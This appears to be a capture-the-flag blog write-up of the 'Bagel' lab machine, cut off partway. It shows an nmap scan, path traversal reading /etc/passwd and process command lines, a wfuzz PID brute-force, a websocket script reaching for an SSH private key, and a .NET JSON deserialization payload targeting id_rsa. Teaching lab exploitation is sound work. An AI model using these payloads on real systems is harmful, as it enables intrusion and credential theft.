@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Writeup Bagel ::
+        roarofhackers — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Intro # Bagel has been a challenging and interesting machine to solve that involved code analysis, WebExploitation, Object De-serialization and many other things.
+Recon # First step on any hacking exercise is to know what are we dealing with. First thing I run is a nmap scan to see opened ports. For those who don’t know, nmap is port scanning tool that tell us which ports and services are running on opened ports."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/writeup-bagel/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Writeup Bagel"/>
+<meta name="twitter:description" content="Intro # Bagel has been a challenging and interesting machine to solve that involved code analysis, WebExploitation, Object De-serialization and many other things.
+Recon # First step on any hacking exercise is to know what are we dealing with. First thing I run is a nmap scan to see opened ports. For those who don’t know, nmap is port scanning tool that tell us which ports and services are running on opened ports."/>
+
+
+
+<meta property="og:title" content="Writeup Bagel" />
+<meta property="og:description" content="Intro # Bagel has been a challenging and interesting machine to solve that involved code analysis, WebExploitation, Object De-serialization and many other things.
+Recon # First step on any hacking exercise is to know what are we dealing with. First thing I run is a nmap scan to see opened ports. For those who don’t know, nmap is port scanning tool that tell us which ports and services are running on opened ports." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/writeup-bagel/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-07-26T16:17:25+02:00" />
+<meta property="article:modified_time" content="2023-07-26T16:17:25+02:00" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/about/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >roarofhackers</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/posts/">Blog</a></li>
+        
+      
+        
+          <li><a href="/cv">CV</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about/">About</a></li>
+      
+    
+      
+        <li><a href="/posts/">Blog</a></li>
+      
+    
+      
+        <li><a href="/cv">CV</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">Writeup Bagel</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          2023-07-26
+        </time>
+
+        
+          
+        
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 10 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+      <figure class="post-cover">
+  
+    <img src="/img/banners/bagel.webp" alt="Writeup Bagel"/>
+  
+
+  
+</figure>
+
+    
+
+    <div class="post-content">
+      
+        
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#user">User</a></li>
+        <li><a href="#root">Root</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></aside>
+        
+      
+      <h2 id="intro">
+  Intro
+  <a href="#intro" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Bagel has been a challenging and interesting machine to solve that involved code analysis, WebExploitation, Object De-serialization and many other things.</p>
+<hr>
+<h2 id="recon">
+  Recon
+  <a href="#recon" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>First step on any hacking exercise is to know what are we dealing with. First thing I run is a nmap scan to see opened ports. For those who don’t know, nmap is port scanning tool that tell us which ports and services are running on opened ports.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>nmap -p- --open -T5 -A -sCV -v 10.10.11.201
+</span></span></code></pre></div><ul>
+<li><em>-p-</em> makes nmap scan through all the 65535 ports</li>
+<li><em>—open</em> makes nmap display only open ports</li>
+<li><em>-T5</em> makes nmap perform a quicker but also agressive scan</li>
+<li><em>-A</em> option will try to detect OS version used</li>
+<li><em>-sCV</em> will attempt to detect service versions and run some default scripts</li>
+<li><em>-v</em> simply makes it verbose so it starts printing out which services are open before it completes the analysis.</li>
+</ul>
+<p>Once the scan is completed, we get the following result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   256 6e:4e:13:41:f2:fe:d9:e0:f7:27:5b:ed:ed:cc:68:c2 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 80:a7:cd:10:e7:2f:db:95:8b:86:9b:1b:20:65:2a:98 (ED25519)
+</span></span><span style="display:flex;"><span>5000/tcp open  upnp?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Server: Microsoft-NetCore/2.0
+</span></span><span style="display:flex;"><span>|     Date: Wed, 05 Jul 2023 12:08:47 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Server: Microsoft-NetCore/2.0
+</span></span><span style="display:flex;"><span>|     Date: Wed, 05 Jul 2023 12:09:02 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|   Help: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html
+</span></span><span style="display:flex;"><span>|     Server: Microsoft-NetCore/2.0
+</span></span><span style="display:flex;"><span>|     Date: Wed, 05 Jul 2023 12:09:12 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 52
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Keep-Alive: true
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Bad Request (Invalid request line (parts).)&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|   RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html
+</span></span><span style="display:flex;"><span>|     Server: Microsoft-NetCore/2.0
+</span></span><span style="display:flex;"><span>|     Date: Wed, 05 Jul 2023 12:08:47 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 54
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Keep-Alive: true
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Bad Request (Invalid request line (version).)&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html
+</span></span><span style="display:flex;"><span>|     Server: Microsoft-NetCore/2.0
+</span></span><span style="display:flex;"><span>|     Date: Wed, 05 Jul 2023 12:09:13 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 52
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Keep-Alive: true
+</span></span><span style="display:flex;"><span>|_    &lt;h1&gt;Bad Request (Invalid request line (parts).)&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: HEAD GET OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
+</span></span><span style="display:flex;"><span>| http-title: Bagel &amp;mdash; Free Website Template, Free HTML5 Template by fr...
+</span></span><span style="display:flex;"><span>|_Requested resource was http://bagel.htb:8000/?page=index.html
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 404 NOT FOUND
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.2.2 Python/3.10.9
+</span></span><span style="display:flex;"><span>|     Date: Wed, 05 Jul 2023 12:08:47 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: 207
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang=en&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 302 FOUND
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.2.2 Python/3.10.9
+</span></span><span style="display:flex;"><span>|     Date: Wed, 05 Jul 2023 12:08:42 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: 263
+</span></span><span style="display:flex;"><span>|     Location: http://bagel.htb:8000/?page=index.html
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang=en&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&#34;http://bagel.htb:8000/?page=index.html&#34;&gt;http://bagel.htb:8000/?page=index.html&lt;/a&gt;. If not, click the link.
+</span></span><span style="display:flex;"><span>|   Socks5: 
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34;
+</span></span><span style="display:flex;"><span>|     &#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html;charset=utf-8&#34;&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request syntax (&#39;
+</span></span><span style="display:flex;"><span>|     &#39;).&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
+</span></span><span style="display:flex;"><span>======================================SNIP=====================================
+</span></span></code></pre></div><p>We see that port 8000 is open with what appears to be a web server, so let’s see what’s on it.</p>
+<p><img src="/img/machines/bagel/port8000webapp.webp" alt=""></p>
+<p>We see that it redirected us to bagel.htb so we add that to our /etc/hosts file and refresh.</p>
+<p><img src="/img/machines/bagel/webpageindex.webp" alt=""></p>
+<p>First thing that came to my attention was the URL: It seems that it’s selecting the page to show on the page parameter in the URL. Experience tells me that this is a potential place to exploit a Path Traversal and/or LFI vulnerability, so I tried changing index.html with /etc/passwd.</p>
+<p><img src="/img/machines/bagel/filenotfound.webp" alt=""></p>
+<p>It appears not to be found, so let’s try to make some Path Traversal.</p>
+<p><img src="/img/machines/bagel/pathtraversal.webp" alt=""></p>
+<p>Using this on the page parameter I managed to download the passwd file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>bin:x:1:1:bin:/bin:/sbin/nologin
+</span></span><span style="display:flex;"><span>daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</span></span><span style="display:flex;"><span>adm:x:3:4:adm:/var/adm:/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:5:0:sync:/sbin:/bin/sync
+</span></span><span style="display:flex;"><span>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span></span><span style="display:flex;"><span>halt:x:7:0:halt:/sbin:/sbin/halt
+</span></span><span style="display:flex;"><span>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+</span></span><span style="display:flex;"><span>operator:x:11:0:operator:/root:/sbin/nologin
+</span></span><span style="display:flex;"><span>games:x:12:100:games:/usr/games:/sbin/nologin
+</span></span><span style="display:flex;"><span>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+</span></span><span style="display:flex;"><span>dbus:x:81:81:System message bus:/:/sbin/nologin
+</span></span><span style="display:flex;"><span>tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>polkitd:x:998:997:User for polkitd:/:/sbin/nologin
+</span></span><span style="display:flex;"><span>rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+</span></span><span style="display:flex;"><span>abrt:x:173:173::/etc/abrt:/sbin/nologin
+</span></span><span style="display:flex;"><span>setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
+</span></span><span style="display:flex;"><span>cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
+</span></span><span style="display:flex;"><span>cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
+</span></span><span style="display:flex;"><span>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+</span></span><span style="display:flex;"><span>chrony:x:994:992::/var/lib/chrony:/sbin/nologin
+</span></span><span style="display:flex;"><span>dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+</span></span><span style="display:flex;"><span>tcpdump:x:72:72::/:/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>developer:x:1000:1000::/home/developer:/bin/bash
+</span></span><span style="display:flex;"><span>phil:x:1001:1001::/home/phil:/bin/bash
+</span></span><span style="display:flex;"><span>_laurel:x:987:987::/var/log/laurel:/bin/false
+</span></span></code></pre></div><p>Some information is revealed to us, such as the users present in the system (developer and phil).
+After that, I didn’t really know how to go further away until I found out that I could enumerate processes thanks to a folder where commands of a given PID are stored. Since I can read files, I could read which command each process on the computer is running by reading the /proc/self/cmdline file.</p>
+<p><img src="/img/machines/bagel/pidcmdline.webp" alt=""></p>
+<p>It downloaded a file again, this time being a txt of the command that runs the web server. As we have the route (/home/developer/app/app.py) we can try to read this file by downloading it using the path traversal payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, send_file, redirect, Response
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os.path
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> websocket<span style="color:#f92672">,</span>json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;page&#39;</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>args:
+</span></span><span style="display:flex;"><span>            page <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;static/&#39;</span><span style="color:#f92672">+</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;page&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(page):
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">=</span>send_file(page)
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>direct_passthrough <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>getsize(page) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Length&#34;</span>]<span style="color:#f92672">=</span>str(len(resp<span style="color:#f92672">.</span>get_data()))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;File not found&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;http://bagel.htb:8000/?page=index.html&#39;</span>, code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/orders&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">order</span>(): <span style="color:#75715e"># don&#39;t forget to run the order app first with &#34;dotnet &lt;path to .dll&gt;&#34; command. Use your ssh key to access the machine.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        ws <span style="color:#f92672">=</span> websocket<span style="color:#f92672">.</span>WebSocket()    
+</span></span><span style="display:flex;"><span>        ws<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#34;ws://127.0.0.1:5000/&#34;</span>) <span style="color:#75715e"># connect to order app</span>
+</span></span><span style="display:flex;"><span>        order <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;ReadOrder&#34;</span>:<span style="color:#e6db74">&#34;orders.txt&#34;</span>}
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> str(json<span style="color:#f92672">.</span>dumps(order))
+</span></span><span style="display:flex;"><span>        ws<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> ws<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>(json<span style="color:#f92672">.</span>loads(result)[<span style="color:#e6db74">&#39;ReadOrder&#39;</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>(<span style="color:#e6db74">&#34;Unable to connect&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>  app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8000</span>)
+</span></span></code></pre></div><p>We can see that there are two routes: The root (the one we were accessing all the time) and other called /orders which seems to be calling a WebSocket requesting to read a file called orders.txt. At first I tried to read some file like the id_rsa of both of the users we found, but with no results. This was the script I tried.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> websocket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ws <span style="color:#f92672">=</span> websocket<span style="color:#f92672">.</span>WebSocket()
+</span></span><span style="display:flex;"><span>ws<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#34;ws://bagel.htb:5000/&#34;</span>) <span style="color:#75715e"># connect to order app</span>
+</span></span><span style="display:flex;"><span>order <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;ReadOrder&#34;</span>:<span style="color:#e6db74">&#34;../../../../home/phil/.ssh/id_rsa&#34;</span>}
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> str(json<span style="color:#f92672">.</span>dumps(order))
+</span></span><span style="display:flex;"><span>ws<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> ws<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>print(json<span style="color:#f92672">.</span>loads(result))
+</span></span></code></pre></div><p><img src="/img/machines/bagel/testpyrun.webp" alt=""></p>
+<p>So with this not working, I started to look more carefully at the code given on app.py and this line got my eye.</p>
+<p><img src="/img/machines/bagel/rememberdll.webp" alt=""></p>
+<p>So the comment is saying that an app should be run before the server and it is a .NET file. It also sugests that we should connect using an SSH key.
+Since we know this app is running and, of course it’s a process and it has a PID, we can apply the same technique than before to get the source code of that .NET application and see what it does.
+Since we don’t know the PID of the app, we will have to brute force it. I will use WFUZZ for that. The options I will use are:</p>
+<ul>
+<li><em>-z</em>: To use a payload. In this specific situation, I will use range,1–1000, which will put numbers from 1 to 1000 wherever the FUZZ word is and so it will fuzz that same parameter, in this case, the PID of the process.</li>
+<li><em>-ss</em>: to specify some content that we want on the file, in this case we want it to contain dotnet since it is how the comment on the app.py code says the app will run.</li>
+<li><em>-u</em>: to indicate the URL to perform the attack.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c -z range,1-10000 --ss dotnet -u <span style="color:#e6db74">&#34;http://bagel.htb:8000/?page=../../../../../../proc/FUZZ/cmdline&#34;</span>
+</span></span></code></pre></div><p><img src="/img/machines/bagel/wfuzz.webp" alt=""></p>
+<p>We get some PIDs, so let’s look at them and see what we find.</p>
+<p><img src="/img/machines/bagel/cmdlinedll.webp" alt=""></p>
+<p>Luckily, the first of them tells us where the file is located, so no more looking onto the others.
+Now, let’s download it with the same method as we’ve been doing. It will download the bagel.dll file. I tried to analyze it with ghidra with no results, so I researched a bit and the best way to perform an analysis on .dll files is to use <a href="https://github.com/dnSpy/dnSpy">dnSpy</a>. This tool allows to see and debug code on .dll.
+When loading the file into dnSpy we get quite a lot of files. I recommend you to go over them before continuing since it will give you more details on what are we doing.</p>
+<p><img src="/img/machines/bagel/dllanalysis.webp" alt=""></p>
+<p>We see we have some packages here, so let’s see what’s interesting on each of them:</p>
+<p><img src="/img/machines/bagel/serializedeserializeused.webp" alt=""></p>
+<p>On the Bagel package we see one of the functions that sets a Handler (see bellow) that is calling a Deserialize and a Serialize method, so let’s see what are those guys doing:</p>
+<p><img src="/img/machines/bagel/codeofserialdeserial.webp" alt=""></p>
+<p>What calls out my attention of this code-block is the TypeNameHandling=4. Some research reveals that this option allows us to set the Type Name of the object.</p>
+<p><img src="/img/machines/bagel/docnamehandling.webp" alt=""></p>
+<p>Having a Serialization with a TypeNameHandling different to 0 can be dangerous and vulnerable to Serialization attacks, since we can chang the $type parameter to any other we want. More info can be found on this <a href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">blogpost</a>
+Taking a look at the Orders package we find another interesting piece of code:</p>
+<p><img src="/img/machines/bagel/orderspackage.webp" alt=""></p>
+<p>This appears to give us some insights on the actions that can be taken on the Orders. We see on the ReadOrder method that it’s replacing all / and .. with no-separation characters, which explains why we could not make any path traversal to get the .ssh previously.
+There appears to be another method called WriteOrder, which writes things to the order and then we have a method called RemoveOrder that has no actions yet. This is key, since as said in the docs of TypeNameHandling if the type serialized and the declared do not match. That means that we could potentially re-define the type to be any other that we want. It would be interesting to re-define it to be ReadFile, which does not have restrictions and would allow us to read the id_rsa file.</p>
+<p><img src="/img/machines/bagel/file.webp" alt=""></p>
+<hr>
+<h2 id="exploitation">
+  Exploitation
+  <a href="#exploitation" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="user">
+  User
+  <a href="#user" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Now we have a good understanding of what’s going on and have a plausible entrance vecor, so with that, let’s craft a payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;RemoveOrder&#34;</span>:
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;$type&#34;</span>:<span style="color:#e6db74">&#34;bagel_server.File, bagel&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ReadFile&#34;</span>:<span style="color:#e6db74">&#34;../../../../home/phil/.ssh/id_rsa&#34;</span>
